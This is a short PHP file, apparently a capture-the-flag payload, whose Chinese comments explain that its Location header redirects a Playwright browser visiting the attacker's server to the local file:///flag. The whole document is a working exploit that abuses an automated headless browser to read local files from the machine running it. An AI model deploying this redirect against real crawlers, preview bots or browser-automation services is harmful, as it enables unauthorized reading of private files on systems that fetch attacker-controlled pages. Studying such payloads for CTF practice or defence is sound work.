<?php
// 文件名: index.php
// 这个 Location 头部会让 Playwright 在访问 http://你的IP/ 后
// 自动跳转到本地 flag 文件
header("Location: file:///flag");
exit;
?>
